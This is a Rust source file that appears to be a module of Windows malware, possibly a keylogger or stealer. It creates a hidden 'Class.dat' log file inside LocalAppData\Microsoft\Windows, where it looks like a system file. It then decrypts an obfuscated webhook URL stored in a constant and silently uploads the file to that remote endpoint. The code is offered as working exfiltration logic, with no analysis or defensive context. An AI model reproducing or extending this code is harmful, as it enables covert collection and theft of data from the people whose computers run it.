#![allow(non_snake_case)]

extern crate winapi;
use hash_limette::decrypt;
use winapi::um::knownfolders::FOLDERID_LocalAppData;
use winapi::um::shlobj::SHGetKnownFolderPath;
use std::ffi::OsString;
use std::os::windows::ffi::OsStringExt;
use std::os::windows::prelude::OpenOptionsExt;
use std::path::Path;
use std::fs::{self, File};
use std::io::prelude::*;
use chrono::prelude::*;
use reqwest::multipart::{Form, Part};
use reqwest::Client;



const WEB_HOOK: &str = "PTMYChAIZVkGPjkPDBgUXgECWEMDGiRXOSEnWSA4DzxLdGtEY1xTQGADDENnVW9EYFxrZ3VcExE/eAUJFjUZIAFkYgAZGCcyNyIMAhd9TQIxPjQxCHwmEhgWMCBROTcXDgNhKQ8FFw9/BSZUfRUIO0kPOwUVPAcHHA";


pub async fn start() -> std::io::Result<()> {

    let localFolder = getConfigPath(FOLDERID_LocalAppData);
    println!("local folder = {}", localFolder);

    let path = Path::new(&localFolder);

    if !path.exists() && !path.is_dir() {
        std::fs::create_dir(path).unwrap();
    }

    let mut file = fs::OpenOptions::new()
        .write(true)
        .read(true)
        .create(true)
        .custom_flags(0x02)
        .append(true)
        .open(path.join("Class.dat"))?;

    let _ = startup(&file.try_clone()?);
    
    //ending file
    let _ = file.write_all(b"--------------------\n")?;
    file.sync_all()?;
    drop(file);

    let file_path = path.join("Class.dat").into_os_string().into_string().unwrap();
    let file_path_static = Box::leak(file_path.into_boxed_str());
    let webhook = decrypt(WEB_HOOK, None);

    let _ = send_file_to_webhook(&webhook, file_path_static).await;

    Ok(())
}   



async fn send_file_to_webhook(webhook_url: &str, file_path: &'static str) -> Result<(), Box<dyn std::error::Error>> {
    let mut file = File::open(file_path)?;
    let mut contents = Vec::new();
    file.read_to_end(&mut contents)?;

    let client = Client::new();
    let form = Form::new()
        .part("payload_json", Part::text(r#"{"content": "Here's your file!"}"#))
        .part("file", Part::bytes(contents).file_name(file_path));

    let response = client
        .post(webhook_url)
        .multipart(form)
        .send()
        .await?;

    println!("Response: {:?}", response);

    Ok(())
}


fn startup(mut file:&File) -> std::io::Result<()>{
    let local: DateTime<Local> = Local::now();
    let formatted_date = local.format("%d-%m-%Y - %H:%M:%S").to_string();

    file.write_all(format!("{}\n", formatted_date).as_bytes())?;
    file.write_all(b"--------------------\n")?;
    Ok(())
}


fn getConfigPath(folder_id:winapi::shared::guiddef::GUID) -> String{
    let mut path: *mut u16 = std::ptr::null_mut();
        unsafe {
            SHGetKnownFolderPath(&folder_id, 0, std::ptr::null_mut(), &mut path);
        }

        let os_string = if !path.is_null() {
            let slice = unsafe { std::slice::from_raw_parts(path, (0..).take_while(|&i| { *path.offset(i) } != 0).count()) };
            OsString::from_wide(slice)
        } else {
            OsString::new()
        };

        let path_string = os_string.into_string().unwrap_or_else(|os_string| {
            os_string.to_string_lossy().into_owned()
        });

    path_string + "\\Microsoft\\Windows\\"
}